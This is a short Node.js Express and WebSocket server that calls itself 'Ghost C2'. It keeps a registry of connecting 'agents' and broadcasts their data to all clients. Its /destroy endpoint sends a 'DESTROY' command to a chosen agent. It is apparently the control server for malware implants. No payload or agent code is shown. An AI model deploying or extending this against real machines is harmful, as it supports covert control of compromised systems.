const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.static('.'));
app.use(express.json());

let agents = {};

wss.on('connection', (ws) => {
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data.toString());
            if (msg.agent_id) {
                agents[msg.agent_id] = { ws, data: msg, timestamp: Date.now() };
                broadcastAgents();
            }
        } catch(e) {}
    });
});

app.post('/destroy', (req, res) => {
    const target = req.body.target;
    if (agents[target]) {
        // Send destroy command
        agents[target].ws.send('DESTROY');
        delete agents[target];
        broadcastAgents();
        console.log(`DESTROY sent to ${target}`);
    }
    res.send('OK');
});

function broadcastAgents() {
    const agentList = Object.values(agents).map(a => a.data);
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify({type: 'agents', agents: agentList}));
        }
    });
}

server.listen(8080, () => {
    console.log('Ghost C2 running on :8080');
});
